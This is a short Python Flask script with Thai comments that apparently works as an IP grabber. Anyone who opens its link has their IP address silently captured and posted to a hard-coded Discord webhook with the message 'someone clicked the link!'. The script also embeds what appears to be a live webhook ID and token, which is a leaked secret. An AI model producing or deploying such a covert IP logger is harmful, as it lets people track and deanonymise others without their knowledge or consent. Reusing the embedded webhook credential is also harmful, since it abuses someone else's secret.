from flask import Flask, request
import requests

app = Flask(__name__)

# Webhook URL ของคุณ
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk"

@app.route("/", methods=["GET"])
def send_ip():
    user_ip = request.remote_addr  # รับ IP ของผู้ใช้
    
    # ข้อมูลที่จะส่งไปยัง Discord
    payload = {
        "content": f"มีคนกดลิงก์! IP: {user_ip}"
    }
    
    try:
        # ส่งข้อมูลไปยัง Discord Webhook
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            return "ส่งสำเร็จ!", 200  # ส่งข้อมูลสำเร็จ
        else:
            return f"ไม่สามารถส่งข้อมูลได้: {response.status_code}, {response.text}", 500
    except Exception as e:
        return f"เกิดข้อผิดพลาด: {str(e)}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
